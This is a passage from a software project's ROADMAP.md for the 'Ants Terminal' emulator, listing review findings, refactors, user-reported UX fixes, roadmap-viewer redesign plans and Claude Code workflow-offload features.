  `claudebgtasks.h:56`. Cppcheck-flagged `returnByReference`. Hot
  read on the new 2 s status-timer path.
- 📋 [ANTS-1037] **Endpoint scheme allowlist on `ai_endpoint`.** `aidialog.cpp:225`.
  Reject anything other than `http`/`https` up-front.
- 📋 [ANTS-1038] **AI SSE parser cap iterations + re-arm via `singleShot(0)`.**
  `aidialog.cpp:249`. Drains parseable head on overflow instead of
  clearing the whole buffer.
- 📋 [ANTS-1039] **Bracketed-paste 8-bit C1 form `\x9B[200~` not stripped.**
  `terminalwidget.cpp:2171`. 8-bit CSI is a valid terminator
  the grid parses; sanitizer only matches 7-bit.
- 📋 [ANTS-1040] **Plan-mode reset on tab switch loses latched state.**
  `claudeintegration.cpp:68`. If the new tab's tail window
  doesn't include the plan-mode toggle event, `m_planMode`
  silently stays false. Re-derive from latched per-tab state.
- 📋 [ANTS-1041] **`ToggleSwitch` accessibility plumbing missing.**
  `toggleswitch.{h,cpp}`. No accessible name, no
  `QAccessibleEvent(StateChanged)` after `setChecked`.
- 📋 [ANTS-1042] **`extraArgs` parsing for IPv6 in Quick Connect.**
  `sshdialog.cpp:325-329`. `[2001:db8::1]:2222` parses host as
  `[2001` and port as 0.

### 🏗 Tier 3 — structural

- 📋 [ANTS-1043] **`mainwindow.cpp` decomposition (6162 LoC).** Extract
  `RepoStatusController` (git/origin/visibility/update helpers,
  ~280 LoC), diff-viewer dialog (`showDiffViewer` and friends,
  ~430 LoC), Claude permission-prompt slot (~160 LoC of nested
  lambdas). ~860 LoC carved off without cross-cutting state.
- 📋 [ANTS-1044] **`auditdialog.cpp` decomposition (5749 LoC).** `populateChecks`
  data table → `auditcatalogue.cpp`; SARIF/HTML export →
  `auditexport.cpp`; embedded sh fragments (e.g. line 444-460,
  567-580) → `packaging/check-*.sh` mirroring the version-drift
  pattern. ~1900 LoC carved off.
- 📋 [ANTS-1045] **`XcbPositionTracker` rename + Wayland-non-KWin abort + temp-
  file leak fix.** `xcbpositiontracker.cpp:13-75`. (a) Class is
  DBus-only, never uses XCB — rename to `KWinPositionTracker`.
  (b) Detect via `qgetenv("XDG_SESSION_TYPE")` and bail before
  writing the temp script on non-KWin. (c) Guarantee
  `QFile::remove(scriptPath)` runs in every failure branch via
  `QScopeGuard`.
- 📋 [ANTS-1046] **Post-fork heap allocations in flatpak detect path.**
  `ptyhandler.cpp:202-220`. `std::string`/`std::vector<const char*>`
  between `forkpty` and `execlp` relies on glibc malloc fork-handler;
  not strictly POSIX-safe. Build argv on the stack with C strings
  before forkpty.
- 📋 [ANTS-1047] **`shellutils.h` denylist regex incomplete.** Missing `*`/`?`/
  `<`/`>`/`[`/`]`. Switch to whitelist: quote unless
  `[A-Za-z0-9_\-./:@%+,]+`.
- 📋 [ANTS-1048] **Reuse-before-rewrite: `claudeChildrenOf(pid)`.** Duplicated
  proc-walking in `ClaudeIntegration::pollClaudeProcess`
  (`claudeintegration.cpp:92-240`) and
  `ClaudeTabTracker::detectClaudeChild`
  (`claudetabtracker.cpp:137-254`). Rule of three says extract now.
- 📋 [ANTS-1049] **Audit-pipeline `populateChecks`-as-data-table.** ~1400 LoC of
  shell-pipeline strings encoded as opaque C++ literals — unreviewable
  and untestable without QProcess. Move to `auditcatalogue.cpp` data
  table; promote multi-line shell fragments to `packaging/check-*.sh`
  mirroring the version-drift script pattern.

The 2026-04-27 review followed the same methodology as the 0.7.12
sweep — no roadmap-internal short-cuts, every finding cites
file:line, every cross-cutting theme has ≥2 lanes flagging it.
Folded as standing practice: re-run `/indie-review` before each
minor tag (next: pre-0.8.0).

### 🐛 Regressions + UX gaps reported post-0.7.55 (user, 2026-04-28)

- 📋 [ANTS-1050] **Auto-return focus to terminal when any dialog closes.** User
  ask: "once any dialog box is closed, automatically shift focus
  back to the terminal prompt." Today every dialog (About,
  Preferences, Roadmap, Update-confirm, AI, SSH, Audit, Snippets,
  …) leaves keyboard focus on the parent `MainWindow` chrome — the
  user has to click into the terminal grid to resume typing. Fix
  is centralised: install a `QObject::eventFilter` on
  `qApp` that watches for `QEvent::Close` on any `QDialog` child
  of `MainWindow`, then `m_currentTerminal->setFocus(Qt::OtherFocusReason)`
  on the active tab's `TerminalWidget` after the close completes
  (`QTimer::singleShot(0, ...)` so the dialog finishes its own
  teardown first). Spec: every dialog-spawn site already routes
  through MainWindow, so a single filter covers them all without
  per-dialog plumbing. Lock with a feature test asserting (a) the
  filter is installed in `MainWindow`'s ctor, (b) `Close` events
  on a synthetic `QDialog` schedule a focus-restore call. Lanes:
  MainWindow, TerminalWidget.
- 📋 [ANTS-1051] **Modal-style "behind the dialog is inert" semantics under the
  KDE/KWin/Wayland constraint.** User ask: "when a dialog box is
  open, only the dialog box is interactive, anything behind the
  dialog box should not be interactive." 0.7.50 deliberately made
  dialogs non-modal to dodge QTBUG-79126 (frameless+translucent
  parent dropping `setModal(true)` clicks on Wayland), so we lost
  click-blocking on the parent window as a side-effect. Plan:
  install a per-dialog `QEventFilter` on the parent `MainWindow`
  that swallows `MouseButtonPress`, `MouseButtonRelease`, and
  `KeyPress` events while the dialog is `isVisible()` — a cheaper
  manual emulation of modality that doesn't trip the Qt/KWin bug
  because we never call `setModal(true)`. Filter installs on
  `QDialog::show`, removes on `QDialog::done`. Edge case:
  dialogs that themselves spawn a child dialog (Preferences →
  Restore-defaults confirm) need filter-stacking, which falls out
  naturally from the per-dialog filter pattern. Lock with
  `tests/features/dialog_pseudo_modal/` asserting the filter
  install/uninstall pattern + the three blocked event types.
  Lanes: MainWindow, AboutDialog, RoadmapDialog, AiDialog,
  SshDialog, SettingsDialog, AuditDialog.
- 📋 [ANTS-1052] **HIGH — Background-tasks status-bar button regressed:
  no longer shows up.** User report 2026-04-28. Locked-in invariant
  from 0.7.32+ (`tests/features/claude_bg_tasks_button/`) is
  passing in CI but the button is missing in the running
  binary. Likely culprits in order of probability: (a) 0.7.49
  Public/Private badge placement reshuffled status-bar widget
  insertion order and the button was demoted past the
  `addStretch()` boundary so it gets clipped; (b) `refreshBgTasksButton`
  early-return added in 0.7.54's liveness-sweep split now hides
  the button when `tasks.isEmpty()` instead of just disabling it,
  but the empty-state should still show as a 0-count chip;
  (c) per-tab scoping introduced in 0.7.32 evaluates the active
  tab's `shellCwd()` to nothing when the user is in a non-Claude
  shell, hiding the button — but it should *still* show when
  Claude is active in any tab. Triage path:
  `git log --oneline -- src/mainwindow.cpp | head -20` plus
  visual diff of `setupStatusBar` between 0.7.39 (last known
  good) and HEAD. Spec extension: extend
  `tests/features/claude_bg_tasks_button/` with a runtime
  visibility assertion (`m_claudeBgTasks->isVisible()` after a
  synthetic claude-session detect) so the next regression catches
  itself. Lanes: MainWindow, ClaudeBgTasks, ClaudeIntegration.
- 📋 [ANTS-1053] **HIGH — Per-tab Background-tasks button scoping.** User
  ask: "[Background Tasks button] should be specific to the tab
  / Claude Code session it is on." Today `ClaudeBgTasks` is a
  single MainWindow-wide model surfacing every running
  `claude` PID across every tab. Fix: shift to per-tab —
  `ClaudeBgTasks` becomes a tab-attached helper (one per
  `TerminalTab`, similar to how `ClaudeIntegration::m_planModeByPid`
  caches per-PID), the status-bar button reads from the active
  tab's helper via `refreshStatusBarForActiveTab`. Discovery
  walks only the active tab's `shellPid()` subtree (lazy probe
  on tick), not every claude-rooted PID system-wide. Storage:
  the helper itself is light enough to live as a
  `std::unique_ptr<ClaudeBgTasks>` member on each tab; cleanup
  follows the tab's lifecycle. Spec extension: add INV asserting
  per-tab instance allocation + active-tab readout. Lanes:
  ClaudeBgTasks, MainWindow, TerminalTab.
- 📋 [ANTS-1054] **MEDIUM — Mystery flashing dialog in centre of terminal.**
  User report: "now and then there is a small dialog box that
  flashes in the centre of the terminal. It is too quick to see
  what it is." Investigation plan: (a) install a
  `QApplication::installEventFilter` debug hook (gated by
  `ANTS_TRACE_DIALOGS=1`) that logs every `QDialog::show` /
  `QDialog::done` with the dialog's `objectName`, parent, and
  call-site `QStackTrace` (Qt 6.8+); (b) reproduce by exercising
  the workflows the user runs daily (file paste, Claude
  notification arrival, audit run completion, GitHub badge tick,
  update check); (c) candidate culprits — auto-update check
  flashing the "no update available" path (regression of the
  0.7.55 hardening that should have suppressed that path), the
  Claude notification-permission dialog firing on every launch
  rather than once-per-session, the SSH-known-hosts confirmation
  dialog firing on transient network blips, the bracketed-paste
  preview dialog flashing then auto-dismissing on tiny pastes;
  (d) once captured, add the appropriate suppression to the
  identified surface and ship as a regression-fix release.
  Telemetry-style: add the `objectName` enforcement on every
  `QDialog` subclass already in the codebase so the next
  occurrence is identifiable from logs. Lanes: MainWindow plus
  whichever dialog-spawn site is found.

### 🔍 CI fold-in (2026-04-28)

- ✅ [ANTS-1099] **Unescaped `&` in 0.7.55 metainfo `<release>` body
  broke `appstreamcli validate`.** CI's "Validate AppStream metainfo"
  step has been red on every commit since the 0.7.55 release
  (`packaging/linux/org.ants.Terminal.metainfo.xml:116` —
  `Now returns const &.`). Fix: escape as `&amp;`. Other `&` in the
  file are already correctly escaped. Same form not present in
  `CHANGELOG.md` or `packaging/debian/changelog` (those aren't
  XML and don't pass through validators). Root cause: the 0.7.55
  release-note authoring overlooked one bare `&` when describing
  a `const &` return-type change. Future-proof: pre-commit hook
  should run `appstreamcli validate` on changes touching
  metainfo.xml — separate item, not in this fold. Kind: doc-fix.
  Source: regression. Lanes: packaging.

### 🎨 Roadmap viewer — enhancement bundle + format standard (user request 2026-04-28)

- ✅ [ANTS-1055] **Public ROADMAP.md format standard + four-doc
  shareable standards bundle.** Shipped 2026-04-28. Original ask:
  "come up with a standard for roadmap.md that we can share with
  Claude Code sessions to ensure that the roadmap is written in
  that format for this terminal to show it off better and in a
  more developer friendly manner." Scope expanded mid-flight from
  one document into four parallel standards
  (`docs/standards/{coding,documentation,testing,commits}.md`)
  plus an index (`docs/standards/README.md`). The ROADMAP format
  spec is folded into `documentation.md § 3` (covering header
  marker `<!-- ants-roadmap-format: 1 -->`, heading hierarchy,
  status/theme emojis, stable IDs in `[PROJ-NNNN]` form,
  insertion-order rules, Kind/Source metadata, current-work
  signaling, fold-in conventions). Sibling Kind/Source coverage
  added across multiple iterations: implement / fix / audit-fix /
  review-fix / doc / doc-fix / refactor / test / chore / release;
  sources include planned / user / audit / indie-review /
  debt-sweep / doc-review / static-analysis / regression /
  external-CVE / upstream-<dep>. The CHANGELOG format
  (Keep-a-Changelog with `[Unreleased]`) is at
  `documentation.md § 4`. Commits standard mandates
  `<ID>: <description>` subjects so every commit ties back to a
  ROADMAP item. Testing standard mandates TDD by default. ADR
  template seeded at `docs/decisions/0001-record-architecture-decisions.md`
  alongside the standards-folder shells (specs/, decisions/,
  journal/). (Subsequently aligned with the suite template — see
  ANTS-1104.) Lanes: docs, ROADMAP, README, CHANGELOG.
- 📋 [ANTS-1105] **Retire deprecated top-level `STANDARDS.md` and
  `RULES.md`.** Both predate the `docs/standards/` bundle
  (created 2026-04-13 / 2026-04-14) and now duplicate content
  that lives canonically in `docs/standards/coding.md` and
  `docs/standards/commits.md`. Per documentation standard § 1.5
  ("one source of truth per fact") they should be removed; the
  README's project-structure tree was updated under ANTS-1104 to
  flag them as deprecated, but the files still ship. Removal is
  a destructive action that warrants user confirmation (no
  automatic deletion). Plan: confirm no external link to either
  file (grep the project + GitHub issues), then `git rm`. Kind:
  doc-fix. Source: debt-sweep-2026-04-30. Lanes: docs.
- ✅ [ANTS-1104] **Sync `docs/standards/` to the App-Build suite
  template.** Shipped 2026-04-30. The four-doc bundle was
  forked into the user-level template at
  `~/.claude/skills/app-workflow/templates/docs/standards/` for
  `/start-app` to scaffold; the template was then refined
  (idiom examples delegated to global `~/.claude/CLAUDE.md § 5`,
  push policy delegated to global § 6, ROADMAP/CHANGELOG format
  spec extracted into a separate `roadmap-format.md` sub-spec
  for token efficiency, `---` horizontal-rule separators removed
  for diff-friendliness, §3.2 numbering gap closed, project-
  agnostic `PROJ-NNNN` placeholder restored). This item brings
  the project's own `docs/standards/` back in line with the
  refined template — the four core standards plus the new
  `roadmap-format.md` sub-spec are now byte-identical to the
  template, so future `/start-app` scaffolds and this project
  share one source of truth. README.md, ROADMAP.md masthead, and
  the CHANGELOG `[Unreleased]` block updated to point at the
  new sub-spec. Kind: doc-fix. Source: user-2026-04-30. Lanes:
  docs.
- 📋 [ANTS-1056] **Roadmap dialog feature additions.** User ask: "please add
  features to the Roadmap dialog box that you think will be useful
  and also come up with a standard for roadmap.md that we can
  share with Claude Code sessions." Candidate additions, in
  priority order:
  (1) **Status filter pill counts** — each filter checkbox shows
  the number of bullets matching that status (`✅ 412 · 🚧 3 ·
  📋 87 · 💭 24 · ★ 2`), updated live with the file-watcher;
  helps a contributor see at a glance how much has shipped
  vs how much is queued.
  (2) **Inline search box** above the TOC — case-insensitive
  substring filter applied across all bullets, scoped to the
  enabled filter checkboxes; complements the TOC's section-jump.
  (3) **"Copy permalink" affordance** — right-click any bullet →
  "Copy ROADMAP.md link" pastes a `https://github.com/owner/repo/
  blob/main/ROADMAP.md#anchor` URL, derived from the GitHub
  origin slug we already cache for the Public/Private badge.
  Falls back to a plain `ROADMAP.md:line` shape outside a GitHub
  repo.
  (4) **Theme overview** — clicking a theme emoji in the legend
  filters to that theme alone (additive to the status filters);
  surfaces "show me everything tagged 📦 Distribution".
  (5) **"Mark as currently tackled" override** — a small
  pin icon on each bullet that toggles a runtime override
  layered on top of the auto-detected highlight set; useful
  when the contributor's current work doesn't match a
  CHANGELOG-or-recent-commit signal yet.
  (6) **Export-as-Markdown** — File → Save filtered view…
  writes the currently-visible bullets to a markdown file the
  user picks, useful for sharing a triaged subset.
  Each addition gets its own feature-test file under
  `tests/features/roadmap_viewer_*/`. Lanes: RoadmapDialog,
  MainWindow.

- 📋 [ANTS-1100] **Roadmap dialog redesign — faceted tabs +
  search + larger window.** User request 2026-04-30 (refines the
  earlier 2026-04-28 ask). Three coordinated changes to the
  `RoadmapDialog`:

  1. **Tab strip** above the TOC, five faceted views over the
     existing parser output (no parser change — pure presentation
     layer):

     | Tab | What it shows | Sort order |
     |-----|---------------|------------|
     | **Full roadmap** | Everything (✅ + 🚧 + 📋 + 💭 + ★) — today's default view | Document order (per roadmap-format.md § 3.5.2) |
     | **History** | ✅ only — what's shipped | Descending chronological (latest release first) |
     | **Current** | 🚧 + ★ — bullets flagged 🚧 OR matching the [Unreleased] / last-5-commit signal (per roadmap-format.md § 3.6) | Document order |
     | **Next** | 📋 only — the work queue | Ascending document order (top of file = highest priority) |
     | **Far Future** | 💭 only — research-phase / nice-to-haves | Document order |

     Existing five filter checkboxes stay — toggling one switches
     to a "Custom" implicit tab (de-emphasised) so the user can
     fine-tune. Token efficiency: zero LLM round-trips — the
     filter bitmask + sort-order + search predicate are all
     evaluated in C++ over the already-parsed bullet list.

  2. **Search field** above the TOC. Case-insensitive substring
     filter applied across bullet headlines + bodies + IDs,
     scoped to the active tab's filter. Live update via
     `QLineEdit::textChanged` → re-render. Should also accept
     `id:1042` shorthand to jump to a specific ID. Debounced at
     ~120 ms so typing doesn't thrash the renderer.

  3. **Larger default size.** Bump from current `resize(800,
     600)` (or wherever it lands) to roughly `resize(1200, 800)`
     with `setSizeGripEnabled(true)` retained. Persist user
     resize via `Config::roadmapDialogGeometry` (saveGeometry /
     restoreGeometry round-trip — same shape as the audit dialog
     already uses).

  Implementation sketch — `roadmapdialog.cpp`/`.h`:
  - `enum class Preset { Full, History, Current, Next, FarFuture, Custom };`
  - `static unsigned filterFor(Preset p);` + new
    `static SortOrder sortFor(Preset p);` (Document /
    DescendingChronological / AscendingDocument).
  - `QTabBar *m_tabs;` placed above `m_filterDone` row.
  - `QLineEdit *m_searchBox;` with debounced timer; passes a
    `QString` predicate into `renderHtml`.
  - Tab `currentChanged` → `applyPreset(p)` →
    `setFilters(filterFor(p), sortFor(p))` → `refresh()`.
  - Checkbox `toggled` → if resulting `(filter, sort)` doesn't
    match any named preset, switch the tab bar to "Custom".

  Spec / lock: new `tests/features/roadmap_viewer_tabs/`
  (spec.md + test_*.cpp). Invariants:
  - INV-1..5: `filterFor(p)` returns the documented bitmask for
    each named preset (Full / History / Current / Next /
    FarFuture).
  - INV-6: `sortFor(History)` is `DescendingChronological`;
    other presets use `Document`.
  - INV-7: tab bar is the first widget in the dialog's vertical
    layout.
  - INV-8: Custom tab activates when the active filter+sort
    combination matches no named preset.
  - INV-9: `applyPreset(History)` rendered HTML contains only ✅
    bullets, in reverse chronological order (round-trip via the
    `renderHtml` static helper — no Qt event loop needed).
  - INV-10: search predicate `"OSC 8"` against a synthetic
    document containing two bullets — one with `OSC 8` in the
    headline, one without — yields exactly one bullet in the
    rendered HTML.
  - INV-11: search predicate `"id:1042"` jumps to the
    `[ANTS-1042]` bullet regardless of headline content.
  - INV-12: dialog default size is `≥ 1100x720`; geometry is
    saved/restored across launches via the persisted
    `roadmapDialogGeometry` key.

  Why this matters for the user's underlying ask: the dialog is
  the user's window into the project's state without spending
  Claude tokens. The tabs replicate the most common Claude-side
  questions ("what's done?" / "what's next?" / "what's in
  flight?") in zero-token UI clicks. Kind: implement. Lanes:
  RoadmapDialog, Config.

### 🎨 Claude Code template integration (user request 2026-04-28)

- 💭 [ANTS-1057] **Claude Code project-template offload.** User ask: "I am
  busy with a Claude Code template for any new project. Once I
  have fully laid it out, I want Ants Terminal to do as much of
  the work as possible so as to reduce token usage." The intent
  is to move template-instantiation work from the LLM into the
  terminal — saving the per-session token cost of asking Claude
  Code to scaffold the same files for every new project. Sketch:
  Settings → "Claude Code template" pane lets the user point at a
  template root directory; `File → New project from template…`
  spawns a wizard that prompts for the project name + target dir,
  copies the template subtree (with mustache-style `{{name}}`
  substitution on file contents and filenames), runs the
  template's `post-init.sh` if present, then opens the new
  project in a fresh tab with `claude` already invoked. Hooks
  into existing Claude-detection so the per-tab status indicator
  comes online immediately. Token savings come from the LLM
  never having to read or write the template files — they're
  baked into the template once, copied verbatim by the terminal.
  Bridges to the existing `roadmap_format` standard above: a
  template that ships `ROADMAP.md` in the v1 format gets
  immediate Roadmap-button support in any tab opened via the
  wizard. Deferred to 💭 because the template format itself
  needs to settle (the user is still iterating); revisit once
  they've shared the laid-out template. Lanes: MainWindow,
  SettingsDialog, new `ProjectTemplateWizard` class, docs.

### 🎨 Undo for accidental tab close (user request 2026-04-30)

- ✅ [ANTS-1101] **Reopen-closed-tab — Ctrl+Shift+Z.** Discovered
  during ANTS-1102 implementation that the headline behaviour was
  already shipped pre-request: `m_closedTabs` deque (cap 10) plus
  a `Ctrl+Shift+Z` action ("Undo Close Tab" in the File menu) that
  pops the stack, opens a new tab, and `cd`s to the saved cwd.
  Code at `mainwindow.cpp:952-970` (action) and `performTabClose`
  (push, refactored from the original `closeTab` body during the
  ANTS-1102 helper split). v1 capacity is hardcoded at 10;
  configurable cap, title-restore, color-restore, and PTY-state
  restore (vim/claude across close) are out of scope — the
  prevention layer (ANTS-1102) covers the catastrophic-loss
  case more effectively. Original ask: "Do you think an
  Undo/Redo feature would be helpful in Ants Terminal in
  relation to closing tabs, colour changes, etc.?" Lanes:
  MainWindow.

- ✅ [ANTS-1102] **Confirm-on-close for tabs running non-shell
  processes.** User-emphasised priority ("the confirm alone will
  help a lot"). Walks `/proc/<shellPid>/task/<shellPid>/children`
  transitively (cap 256 visited), comparing each descendant's
  `comm` against an 11-shell allowlist (`bash`, `zsh`, `fish`,
  `sh`, `ksh`, `dash`, `ash`, `tcsh`, `csh`, `mksh`, `yash`).
  First non-shell descendant triggers a Wayland-correct non-modal
  `QDialog` (heap, `WA_DeleteOnClose`, plain `QPushButton`s, no
  `setModal` per the 0.7.50 QTBUG-79126 lessons) naming the
  process; "Cancel" returns silently, "Close anyway" calls
  `performTabClose`, optionally with a "Don't ask again"
  checkbox flipping `Config::confirmCloseWithProcesses` to false.
  Default on. Settings → Window/Tabs surface added. Refactored
  `closeTab` into `closeTab` (probe gate) + `performTabClose`
  (teardown) so the dialog's accept handler can re-enter cleanly.
  Locked by `tests/features/confirm_close_with_processes/`
  (11 invariants — config getter/setter + storeIfChanged
  idempotency, `firstNonShellDescendant` helper shape,
  `safeShellNames` baseline, `closeTab` probe + dialog routing,
  `performTabClose` is the sole teardown + undo-push site, dialog
  uses the Wayland-correct pattern, "Don't ask again" flips the
  config, full SettingsDialog wire-up). Lanes: Config, MainWindow,
  SettingsDialog.

- 💭 [ANTS-1103] **Generic UI-action undo / redo stack
  (deferred).** A wider mechanism beyond tab-close: font-size
  changes, theme-pick, layout splits, etc. Not recommended —
  Settings dialog already has Cancel/OK for everything it owns;
  the one remaining uncovered surface (tab-close) is handled by
  ANTS-1101 + ANTS-1102 with a cheap implementation. Revisit
  only if user feedback shows specific UI actions repeatedly in
  need of undo. If reopened, the design likely splits per-domain
  (tabs, themes, panes — each its own LIFO) rather than one
  global stack so `Ctrl+Z` doesn't ambiguously cross domains.
  Lanes: TBD.

### 🎨 App-Build native integration (user request 2026-04-30)

> **Strategic theme.** Move as much of the App-Build per-phase
> 9-step loop into Ants Terminal natively as possible. Goal stated
> by the user: "minimise token usage" by offloading mechanical
> work from Claude Code to Ants. Triage of the 9 steps:
>
> | Step | Where it should run | Token cost |
> |------|---------------------|------------|
> | 1. Verify spec | Claude (judgment) | LLM |
> | 2. Verify deps on the DAG | Ants (graph walk over `Source:` / `Refs:`) | none |
> | 3. Write failing tests | Claude (drafting) | LLM |
> | 4. Implement until green | Claude (drafting) | LLM |
> | 5. Run `/audit` | Ants (already runs cppcheck/clazy/semgrep/etc. natively in `auditdialog`) | none |
> | 6. Run `/indie-review` | Claude (judgment) | LLM |
> | 7. Fold actionable findings → new FP## item | Ants (atomic file edit + counter increment) | none |
> | 8. Update CHANGELOG / ROADMAP / journal | Mostly Ants (status flips, dated section creation, file moves); Claude only for the prose body | partial |
> | 9. Commit, tag, push | Ants (`git` shell-out + `gh release create` for the GitHub-attached body) | none |
>
> Steps 2, 5, 7, parts of 8, and 9 are mechanical — they collapse
> from "ask Claude to run the tool, paste the output, ask Claude
> to triage, ask Claude to update the file" into one button
> click. That's the win.

- 📋 [ANTS-1106] **Mandatory `Kind:` field + viewer faceted
  categorisation.** Stable IDs stay monotonic (`[ANTS-NNNN]`
  with one counter at `.roadmap-counter`) — kind-prefixed IDs
  considered and rejected (per-type counters fragment atomic
  allocation; reclassifying a bullet's Kind would either renumber
  it (breaks links) or create prefix/Kind mismatch). Instead, the
  cleaner win is making the existing optional `Kind:` field
  **required**: every bullet declares `Kind: implement|fix|
  audit-fix|review-fix|doc|doc-fix|refactor|test|chore|release`.
  The roadmap dialog adds a secondary faceted strip under the
  ANTS-1100 tabs that lets the user filter by Kind (one or more
  checked at a time), with per-Kind colour cues so an audit-fix
  visually pops vs an `implement`. Backfill pass: scan every
  existing bullet, infer `Kind:` from section heading + body, add
  the line. Update `roadmap-format.md § 3.5.3` so the field is
  documented as required (currently "MAY be omitted") and pull
  the same change through to
  `~/.claude/skills/app-workflow/templates/docs/standards/roadmap-format.md`
  so the App-Build template stays aligned. Token efficiency: the
  Kind facet is the structured tag the dialog needs to do the
  user's "what kinds of work are queued?" query without an LLM
  round-trip. Kind: doc-fix. Source: user-2026-04-30. Lanes: docs,
  RoadmapDialog.

- 📋 [ANTS-1107] **Adopt App-Build documentation folder
  structure.** The user-level `/start-app` template ships a
  richer `docs/` tree than this project currently has. Bring
  Ants Terminal in line:

  | File / dir | Purpose | Action |
  |------------|---------|--------|
  | `docs/standards/` | Shareable v1 standards bundle | ✅ done in ANTS-1104 |
  | `docs/decisions/` | ADRs (Michael Nygard) | ✅ scaffolded in ANTS-1055 |
  | `docs/specs/` | Per-feature spec drafts | ✅ scaffolded |
  | `docs/journal/` | Per-phase outcomes / session notes | ✅ scaffolded (currently empty) |
  | `docs/glossary.md` | Project terminology (VT actions, OSC numbers, MCP, IPC, etc.) | 📋 create — pull from CLAUDE.md module map and PLUGINS.md |
  | `docs/known-issues.md` | Deferred bugs / upstream-blocked items / platform-specific quirks | 📋 create — start with QTBUG-79126, KWin maximize-restore, etc. |
  | `docs/audit-allowlist.md` | Confirmed false positives the audit pipeline skips | 📋 create — current allowlist lives in `.audit_suppress` JSONL; surface human-readable rationale here |
  | `docs/ideas.md` | Far-future research / nice-to-haves | 📋 create — lift the 💭 bullets out of ROADMAP into a dedicated file |
  | `docs/discovery.md` | First-principles project framing | N/A — Ants is post-discovery; document the project's history briefly in `README.md` instead |
  | `docs/design.md` | Architecture overview | 📋 create — extract from CLAUDE.md module-map + data-flow + design-decision sections; keep CLAUDE.md as the terse Claude-facing brief |
  | `.claude/workflow.md` | Phase-tracking § 1 status header + journal § 3 | 📋 create — adapted to a post-1.0 release-driven project (no Phase A/B/C/D since discovery is decades behind us; the active surface is "current `[Unreleased]` cycle" + "next release target") |

  Use this as a forcing function to delete `STANDARDS.md` and
  `RULES.md` (per ANTS-1105) — their content was already
  duplicated by `docs/standards/coding.md`. Each new file gets
  one commit. Kind: doc. Source: user-2026-04-30. Lanes: docs.

- 📋 [ANTS-1108] **Native App-Build runner inside Ants Terminal
  — the strategic token-saver.** User ask 2026-04-30:
  "incorporate the Ants App-Build suite into Ants Terminal so
  that any user using Ants Terminal can use this without a
  Claude subscription. Or at least perform as much as possible…
  the aim is to reduce token usage by off-loading as much as
  possible to Ants Terminal to perform instead of Claude Code."
  Concrete deliverables, in priority order:

  1. **Workflow panel** — new dialog, opens via `View →
     Workflow` (or status-bar button). Reads `.claude/workflow.md`
     § 1 status header; renders phase / active item / step
     progress (✅ ⬜ 🚧). Each mechanical step from the 9-step
     loop is a button:
     - **Allocate next ID** — atomic increment of
       `.roadmap-counter` under flock; copies `[ANTS-NNNN]` to
       clipboard. (Replaces "ask Claude for the next ID".)
     - **Run `/audit`** — invokes the existing `auditdialog`
       pipeline scoped to the active item's `Lanes:`. Findings
       feed the existing triage UI; folding into ROADMAP via a
       templated `### 🔍 Audit fold-in (YYYY-MM-DD)` block done
       by Ants directly (atomic file edit). (Replaces "ask Claude
       to run /audit, paste the JSON, triage, fold in".)
     - **Run tests** — `ctest --output-on-failure -L <lanes>`
       in-process; parses CTest output, renders pass/fail with
       per-test logs in a panel. (Replaces "ask Claude to run
       ctest and report".)
     - **Run drift check** — shells out to
       `packaging/check-version-drift.sh`; renders pass/fail.
     - **Run `/debt-sweep`** — native scanner: stale
       `Q_UNUSED` / `_unused` markers, ROADMAP items still 📋
       after a matching commit, packaging files still on a
       previous version, comments referring to renamed types.
       Surfaces a diff-style preview the user accepts/rejects.
       (Replaces the LLM-driven debt-sweep delegate today.)
     - **Run `/bump <version>`** — parses
       `.claude/bump.json` and applies every templated edit
       in-process via `QFile` + atomic write. (Replaces the
       Claude-driven `/bump` skill end-to-end.)
     - **Run `/release`** — orchestrates `/bump` → build →
       tests → drift → commit → tag (gated by all-green; a
       failing test stops the run with a structured error).

  2. **CHANGELOG / ROADMAP edits** — Ants writes the templated
     parts (status emoji flips, dated section creation, ID
     allocation, fold-in headings) directly. Claude is only
     invoked when the user wants prose drafted (a CHANGELOG
     bullet body, a journal entry, an ADR), at which point Ants
     opens the existing `aidialog` with a structured prompt
     pre-filled — the user's own LLM credentials, billed once,
     not per-step.

  3. **`/start-app` analogue** — `File → New project from
     App-Build template…` (extends ANTS-1057). Wizard prompts
     name + path, copies
     `~/.claude/skills/app-workflow/templates/` with
     mustache-style substitution, runs `git init` +
     scaffold-commit, opens in a fresh tab. Zero LLM round-trips.

  4. **`/indie-review` partial offload** — Ants can still run
     the lane partition + per-lane diff extraction natively;
     the actual per-lane judgment stays in Claude (or the user's
     own LLM via aidialog). This step is the only one that
     genuinely needs LLM judgment, and even there, Ants prepares
     the prompt so the user spends one LLM call per lane instead
     of N.

  5. **Per-phase completion ceremony** — flip status to ✅,
     cross-reference the commit SHA in the bullet, write the
     journal entry stub, ask the user about push. All
     mechanical, all in C++.

  Out of scope for v1: drafting prose (always Claude-shaped),
  cross-cutting refactor judgment (review needs a model), spec
  brainstorming. The contract: Ants does file IO + tool
  orchestration + parsing + atomic edits + ID allocation; Claude
  (or the user's own LLM via aidialog) does prose + judgment.

  Spec parser: reads `tests/features/*/spec.md`, extracts INV
  numbers + their assertions, can scaffold a test stub. CMake
  wiring done by a templated `add_executable + add_test` block.

  Storage: workflow state in `.claude/workflow.md` (already the
  contract); no new config keys. The dialog reads / writes that
  file directly.

  Subsumes / supersedes the narrower ANTS-1057 (Claude Code
  template offload) — that bullet stays for cross-reference but
  its scope folds entirely into ANTS-1108.

  Locked by `tests/features/workflow_runner/` (spec.md + tests
  for: ID allocator atomicity under concurrent flock,
  bump-recipe parser correctness, drift-check shell-out
  exit-code propagation, audit-finding fold-in produces a
  syntactically valid ROADMAP block matching roadmap-format.md
  § 3.5.6, debt-sweep finding categorisation matches the
  existing `/debt-sweep` skill's triage table). Kind: implement.
  Source: user-2026-04-30. Lanes: MainWindow, new
  `WorkflowDialog`, AuditDialog, Config, build/CMake.

### 🎨 Status-bar polish (user request 2026-04-30)

- 📋 [ANTS-1109] **Restyle the git-branch chip to match the
  repo-visibility pill.** User screenshot 2026-04-30:
  `main` branch label sits as plain text next to the framed
  green `Public` pill, looking inconsistent now that the
  visibility pill ships. Match the chip styles: same border
  radius, same padding, same font size; colour cue derived
  from the branch — e.g. green outline for `main` /
  `master` / `trunk`, amber outline for any other branch
  (visual hint that the user is on a feature branch).
  Implementation lives in `mainwindow.cpp` status-bar widget
  setup (search `m_branchLabel` / git-branch chip); style via
  `setStyleSheet` mirroring the visibility-pill rule. Locked
  by source-grep invariants in
  `tests/features/status_bar_branch_chip/`:
  - INV-1: branch label uses the same `border: 1px solid` /
    `border-radius` / `padding` shape as the visibility pill
    (compare style-sheet substrings).
